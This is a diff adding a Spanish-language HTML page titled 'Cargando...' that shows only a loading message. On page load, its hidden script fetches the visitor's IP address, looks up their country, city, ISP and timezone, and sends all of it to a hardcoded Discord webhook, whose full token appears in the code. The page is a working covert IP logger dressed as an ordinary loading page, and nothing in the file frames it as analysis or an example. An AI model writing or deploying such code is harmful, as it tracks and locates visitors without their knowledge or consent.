@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Cargando...</title>
+</head>
+<body>
+  <script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1572762860977651815/IXLv5YHFBbKXF1r0QdR0C5ktOdBZvsp3Cn0apQu3LFGFtouMgo4odm3TBlvcaoIqNgRm";
+
+    async function logVisitor() {
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await ipRes.json();
+
+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geo = await geoRes.json();
+
+        const payload = {
+          content: null,
+          embeds: [{
+            title: "👁️ Nuevo visitante",
+            color: 0x5865F2,
+            fields: [
+              { name: "IP", value: ip, inline: true },
+              { name: "País", value: geo.country_name || "N/A", inline: true },
+              { name: "Ciudad", value: geo.city || "N/A", inline: true },
+              { name: "ISP", value: geo.org || "N/A", inline: true },
+              { name: "Timezone", value: geo.timezone || "N/A", inline: true }
+            ],
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        await fetch(WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    logVisitor();
+  </script>
+  <p>Cargando contenido...</p>
+</body>
+</html>
